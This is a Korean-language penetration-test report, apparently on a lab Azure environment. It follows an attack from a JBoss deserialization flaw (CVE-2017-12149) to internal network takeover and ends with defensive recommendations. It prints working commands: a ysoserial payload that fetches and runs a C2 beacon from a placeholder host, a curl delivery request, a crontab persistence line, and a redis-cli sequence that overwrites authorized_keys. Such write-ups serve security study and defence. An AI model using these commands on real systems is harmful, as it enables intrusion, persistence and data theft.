---
layout: post
title: "CyberKillChain-C: 웹 거점 피보팅을 통한 내부 Bastion 및 네트워크 장악 보고서"
date: 2025-11-23 16:00:00 +0900
categories: [cyber-kill-chain, penetration-testing]
---

### **목차**
- [0. 모의 해킹 개요](#0-모의-해킹-개요)
  - [0.1. 목적](#01-목적)
  - [0.2. 방법론](#02-방법론)
  - [0.3. 시스템 아키텍처](#03-시스템-아키텍처)
- [1. 정찰 (Reconnaissance)](#1-정찰-reconnaissance)
- [2. 무기화 (Weaponization)](#2-무기화-weaponization)
- [3. 유포 (Delivery)](#3-유포-delivery)
- [4. 악용 (Exploitation)](#4-악용-exploitation)
- [5. 설치 (Installation)](#5-설치-installation)
- [6. 명령 및 제어 (Command and Control)](#6-명령-및-제어-command-and-control)
- [7. 목적 달성 (Action on Objectives)](#7-목적-달성-action-on-objectives)
  - [7.1. 1단계: 내부 정찰 및 피벗 대상 식별](#71-1단계-내부-정찰-및-피벗-대상-식별)
  - [7.2. 2단계: 내부 피보팅 (Lateral Movement via Redis)](#72-2단계-내부-피보팅-lateral-movement-via-redis)
  - [7.3. 3단계: 거점 이전 및 네트워크 장악](#73-3단계-거점-이전-및-네트워크-장악)
- [8. 종합 분석 및 권고 사항](#8-종합-분석-및-권고-사항)

---

## 0. 모의 해킹 개요

### 0.1. 목적

본 보고서는 `CKCProject` 환경을 대상으로, **제한적인 외부 침투 경로(웹 취약점)를 교두보 삼아 내부의 신뢰받는 관리 경로(Azure Bastion)를 장악**하고, 이를 통해 네트워크 전체의 제어권을 확보하는 고도의 "양동 작전" 시나리오의 결과와 분석을 기술한다. 본 모의 해킹의 목적은 공격자가 초기 거점의 한계를 극복하고 내부 네트워크의 신뢰 관계를 악용하여 어떻게 공격 표면을 확장하고 제어권을 강화하는지를 증명하는 데 있다.

### 0.2. 방법론

본 모의 해킹은 사이버 킬체인 방법론을 따르되, 특히 '목적 달성(Action on Objectives)' 단계를 여러 하위 단계로 나누어 **내부 피보팅(Internal Pivoting)**과 **거점 이전(Foothold Migration)** 과정을 집중적으로 분석한다. 모든 공격 행위는 MITRE ATT&CK® 프레임워크에 매핑되었다.

### 0.3. 시스템 아키텍처

테스트 대상 환경의 아키텍처는 이전 시나리오와 동일하며, 본 시나리오는 Load Balancer를 통해 웹 티어에 진입한 후, 내부에서 Azure Bastion 관리 경로를 탈취하는 복합적인 경로를 따른다.

```text
   +-----------------+
   [   INTERNET   ] <-----> | Azure LB          |----->| Private Subnet  |
   (1. Initial Access)     | (Service Port 80) |      | (Web VMSS x2)   |
                             +-------------------+      +-------+---------+
                                                                | (2. Internal Pivot)
                                                                v
   +------------------+      +-------------------+      +-----------------+
   |   Operator (PC)  |--X-->| Azure Bastion     |<-----| Private Subnet  |
   +------------------+      | (Blocked from Web)|      | (3. Hijack & Attack) |
                             +-------------------+      +-----------------+
```

---

## 1. 정찰 (Reconnaissance)

**목표:** 외부에서 접근 가능한 자산을 식별하고, 직접적인 원격 코드 실행이 가능한 고위험 침투 지점을 파악.

*   **실행 및 분석:**
    시나리오 A와 달리, 단순 웹 취약점을 넘어 엔터프라이즈급 애플리케이션을 공략 대상으로 삼고 정찰을 수행했다.
    *   **[T1595.001] Active Scanning:** `nmap -sV -p-` 명령으로 전체 포트를 스캔, 외부에 노출된 모든 서비스를 식별했다.
    *   **[T1592] Gather Victim Host Information:** `nmap`의 서비스 버전 감지 기능을 통해, `8082/tcp` 포트에서 JBoss Application Server의 변종인 `Wildfly 10.1.0.Final`이 동작 중인 것을 확인했다.
    *   **[T1594] Search Victim-Owned Websites:** 공개된 취약점 정보(CVE) 데이터베이스를 통해, 해당 JBoss 버전이 **인증 없는 역직렬화 원격 코드 실행 취약점(CVE-2017-12149)**에 노출되어 있음을 확인했다.

    > **[여기에 스크린샷 1: `nmap` 스캔 결과 `8082/tcp` 포트에서 JBoss/Wildfly 서비스가 식별된 터미널 화면]**

*   **결론:** 이 단계에서 공격자는 웹 셸 업로드와 같은 다단계 과정이 필요 없는, 직접적인 RCE가 가능한 치명적인 침투 경로를 확보했다. 이는 공격의 속도와 은밀함을 극대화할 수 있는 결정적인 정보이다.

---

## 2. 무기화 (Weaponization)

**목표:** 식별된 JBoss 역직렬화 취약점을 공략하여 C2 세션을 획득할 수 있는 맞춤형 페이로드를 제작.

*   **실행 및 분석:**
    *   **[T1588.002] Obtain Capabilities: Tool:** 공개된 Java 역직렬화 페이로드 생성 도구(`ysoserial`)와 C2 프레임워크(Sliver)를 활용했다.
    *   **[T1608.005] Stage Capabilities: C2 Channel:** 후속 공격의 기반이 될 C2 인프라를 준비.

    1.  **C2 Beacon 생성:** Sliver를 사용하여 대상 시스템(Linux/amd64)에서 실행될 C2 Beacon(`genesis_c.elf`)을 제작했다.
    2.  **역직렬화 페이로드 제작:** `ysoserial`을 사용하여, 실행 시 C2 Beacon을 다운로드하고 실행하는 셸 명령어를 트리거하는 직렬화된 Java 객체 페이로드(`payload.ser`)를 생성했다.
        ```bash
        java -jar ysoserial-master.jar CommonsCollections5 "wget http://<C2_IP>/genesis_c.elf -O /tmp/g.elf; chmod +x /tmp/g.elf; /tmp/g.elf" > payload.ser
        ```

*   **결론:** JBoss 서버가 처리하는 순간 원격 코드 실행을 유발하는 정교한 '원샷' 무기가 준비되었다.

---

## 3. 유포 (Delivery)

**목표:** 제작된 악성 역직렬화 페이로드를 취약한 JBoss 애플리케이션 엔드포인트에 전달.

*   **실행 및 분석:**
    *   **[T1190] Exploit Public-Facing Application:** 외부 공개 JBoss 애플리케이션의 취약한 엔드포인트를 공격 경로로 사용.

    `curl`을 사용하여 제작된 악성 페이로드(`payload.ser`)를 JBoss의 취약한 `/invoker/JNDIFactory` 엔드포인트로 전송했다. 이 요청의 HTTP Body에 담긴 악성 페이로드는 JBoss 서버에 도달하여 처리 대기 상태가 된다.

    ```bash
    curl http://<LOAD_BALANCER_IP>:8082/invoker/JNDIFactory --data-binary @payload.ser
    ```
    > **[여기에 스크린샷 2: `curl` 명령어를 통해 악성 `payload.ser` 파일을 JBoss 서버로 전송하는 터미널 화면]**

*   **결론:** 공격 페이로드가 성공적으로 목표 시스템의 애플리케이션 처리 큐 내부에 전달되었다.

---

## 4. 악용 (Exploitation)

**목표:** JBoss 서버가 유포된 악성 페이로드를 역직렬화하도록 하여, 원격 코드 실행을 트리거하고 초기 접근 권한을 획득.

*   **실행 및 분석:**
    *   **[T1210] Exploitation of Remote Services:** JBoss 서버가 `payload.ser`를 처리(역직렬화)하는 순간, 내부에 포함된 악성 코드가 서버의 컨텍스트에서 실행되었다.
    *   **[T1059.004] Command and Scripting Interpreter: Unix Shell:** 페이로드에 포함된 `wget` 및 `chmod` 명령어가 실행되어, C2 Beacon이 다운로드 및 실행되었다.

*   **결론:** 웹 셸과 같은 중간 과정 없이, JBoss 애플리케이션의 취약점을 직접 악용하여 시스템에 대한 원격 코드 실행 권한을 획득하는 데 성공했다.

---

## 5. 설치 (Installation)

**목표:** 악용 단계를 통해 실행된 일회성 C2 Beacon을, 시스템 재부팅 후에도 살아남는 영구적인 백도어로 전환.

*   **실행 및 분석:**
    *   **[T1053.003] Scheduled Task/Job: Cron:** 악용 성공 직후 생성된 임시 C2 세션을 통해, 현재 사용자(`jboss` 또는 `wildfly`)의 `crontab`에 C2 Beacon을 재실행하는 구문을 등록했다.
        ```bash
        # JBoss 권한의 C2 세션에서 실행
        (crontab -l 2>/dev/null; echo "* * * * * /tmp/g.elf") | crontab -
        ```
*   **결론:** 초기 침투를 통해 확보한 접근 경로에 지속성을 부여하여, 안정적인 후속 공격 기반을 마련했다.

---

## 6. 명령 및 제어 (Command and Control)

**목표:** C2 Beacon을 통해 공격자의 서버와 안정적인 통신 채널을 수립하고, 제한적인 초기 거점을 확보.

*   **실행 및 분석:**
    *   **[T1071.001] Application Layer Protocol: Web Protocols:** 실행된 C2 Beacon이 NAT Gateway를 통해 C2 서버로 콜백하여 **`jboss` (또는 `wildfly`) 권한의 초기 세션(`INITIAL_JBOSS_SESSION`)**이 생성되었다.
    *   이 세션은 `www-data`보다는 권한이 높을 수 있지만 여전히 `root`가 아니며, JBoss 프로세스 자체의 불안정성으로 인해 언제든 끊길 수 있는 불안정한 거점이다.

    > **[여기에 스크린샷 3: Sliver C2 서버에 `jboss` 사용자로 `INITIAL_JBOSS_SESSION`이 생성된 화면]**

*   **결론:** 이 불안정한 거점은 최종 목표가 아닌, 다음 공격을 위한 **전술적 교두보**로 활용되었다. 공격의 핵심인 '피보팅'은 지금부터 시작된다.

---

## 7. 목적 달성 (Action on Objectives)

**목표:** 제한된 JBoss 거점을 활용하여 내부 네트워크를 장악하고 최종 목표를 달성하는 다단계 과정.

### 7.1. 1단계: 내부 정찰 및 피벗 대상 식별 (Internal Reconnaissance & Pivot Target Identification)

*   **목표:** JBoss 거점에서 내부 네트워크 정보를 수집하고, 더 나은 공격 경로(피벗 대상)를 식별.
*   **실행 및 분석:**
    `INITIAL_JBOSS_SESSION`을 통해 내부망 스캔을 수행했다.
    *   **[T1046] Network Service Scanning:** `nmap` 스캔 결과, 외부에서는 보이지 않던 **인증 없는 Redis 서버(`10.42.3.x:6379`)**가 내부망에 노출된 것을 발견했다.
    *   **[T1083] File and Directory Discovery:** `ls -la /home` 명령을 통해 `attacker` 라는 관리자 계정의 존재를 확인했다.
    *   **전략적 결정:** 현재의 불안정한 `jboss` 거점 대신, Redis 서버를 발판 삼아 `attacker` 계정의 제어권을 탈취하는 것으로 목표를 재설정했다.

    > **[여기에 스크린샷 4: `nmap` 스캔 결과 `6379/tcp open redis`가 식별된 터미널 화면]**

### 7.2. 2단계: 내부 피보팅 (Lateral Movement via Redis)

*   **목표:** `jboss` 권한에서 Redis 서버를 악용하여 `attacker` 관리자 계정의 제어권을 탈취.
*   **실행 및 분석:**
    `root` 권한 없이, 내부 서비스 간의 신뢰 관계와 설정 오류를 이용하는 정교한 수평 이동을 수행했다.
    1.  **[T1021.007] Cloud Services:** `jboss` C2 세션에서 `redis-cli`를 이용해 내부 Redis 서버에 접속했다.
    2.  **SSH 키 덮어쓰기:** Redis의 파일 저장 기능을 악용하여, 공격자 본인의 SSH 공개 키를 `attacker` 사용자의 `~/.ssh/authorized_keys` 파일에 덮어썼다.
        ```bash
        # 1. 공격자의 SSH 공개 키를 Redis 값으로 설정
        (echo -e "\n\n"; cat attacker_key.pub; echo -e "\n\n") > key.txt
        redis-cli -h 10.42.3.x flushall
        cat key.txt | redis-cli -h 10.42.3.x -x set attacker_ssh_key

        # 2. Redis가 DB를 저장할 디렉터리와 파일 이름을 변경
        redis-cli -h 10.42.3.x config set dir /home/attacker/.ssh/
        redis-cli -h 10.42.3.x config set dbfilename "authorized_keys"

        # 3. DB 저장 명령으로 파일 쓰기 실행
        redis-cli -h 10.42.3.x save
        ```
    > **[여기에 스크린샷 5: `redis-cli`를 이용해 `attacker`의 `authorized_keys` 파일을 덮어쓰는 일련의 명령어 실행 화면]**

### 7.3. 3단계: 거점 이전 및 네트워크 장악 (Foothold Migration & Network Dominance)

*   **목표:** 불안정한 초기 거점을 버리고, 탈취한 관리자 권한으로 안정적인 새 거점을 구축하여 네트워크를 완전히 장악.
*   **실행 및 분석:**
    1.  **[T1550] Use Alternate Authentication Material:** Redis 공격 성공 후, `jboss` 세션에서 공격자 자신의 개인 키를 사용하여 `attacker` 계정으로 SSH 접속(`ssh -i ./attacker_key attacker@localhost`)에 성공했다.
    2.  **거점 이전 (Foothold Migration):** `attacker` 권한을 획득한 셸에서, 새로운 C2 Beacon(`stable_c.elf`)을 설치했다. Sliver 클라이언트에 **안정 세션(`STABLE_ATTACKER_SESSION`)**이 생성되자, 추적을 피하기 위해 기존 `INITIAL_JBOSS_SESSION`은 즉시 종료시켰다.
    
    > **[여기에 스크린샷 6: Sliver C2에 `attacker` 사용자로 `STABLE_ATTACKER_SESSION`이 새로 생성되고, 기존 `jboss` 세션은 사라진 화면]**

    3.  **[T1021.004] 내부망 장악 (Network Dominance via SSH):** `STABLE_ATTACKER_SESSION`을 통해 내부망의 모든 서버로 자유롭게 `ssh` 수평 이동하며 전체 네트워크를 장악하고, 최종적으로 DB 데이터를 유출하며 작전을 완수했다.

---

## 8. 종합 분석 및 권고 사항

본 시나리오 C는 외부 엔터프라이즈 앱 취약점으로 시작하여, 내부 서비스의 설정 오류를 교묘하게 이용해 관리자 권한을 탈취하는, 고도로 숙련된 공격자의 현실적인 침투 과정을 증명한다.

| 공격 단계 | 식별된 위협 및 관련 TTP | 구체적인 보안 강화 권고 사항 |
| :--- | :--- | :--- |
| **초기 침투** | JBoss 역직렬화 RCE 취약점<br/>**[T1190, T1210]** | **소프트웨어 구성 분석(SCA) 및 가상 패치:** 애플리케이션이 사용하는 모든 오픈소스 라이브러리(JBoss 등)의 버전을 식별하고, 알려진 취약점이 발견될 경우 즉시 패치를 강제한다. WAF에 해당 취약점을 차단하는 가상 패치(Virtual Patching) 규칙을 적용한다. |
| **내부 피보팅**| 인증 없는 내부 Redis 서버 노출<br/>**[T1046, T1021.007]** | **Zero Trust 원칙 적용 및 Micro-segmentation:** "내부망은 안전하다"는 가정을 버려야 한다. JBoss 서버가 Redis 서버에 접근할 이유가 없다면 NSG 규칙으로 차단해야 한다. 모든 내부 서비스(Redis 등)에 **인증을 의무화**하고, 최소한의 IP만 접근을 허용하도록 설정한다. |
| **피보팅/장악**| 내부 서버 간 SSH 신뢰 관계<br/>**[T1550]**| **자격 증명 격리 및 보호:** 관리자(`attacker`)의 SSH 키는 암호(Passphrase)로 보호되어야 하며, 다른 서비스(Redis)가 관리자의 홈 디렉터리에 파일을 쓸 수 없도록 파일 시스템 권한을 엄격하게 관리한다. |
| **전반** | 내부의 비정상적 행위 탐지 부재 | **내부 위협 탐지 강화(EDR/NDR):** 내부망 트래픽을 모니터링하여, JBoss 서버가 Redis에 접속하거나 SSH 스캔을 시도하는 등 비정상적인 행위를 탐지하고 즉시 경고하는 시스템(Azure Defender for Cloud 등)을 도입해야 한다. |
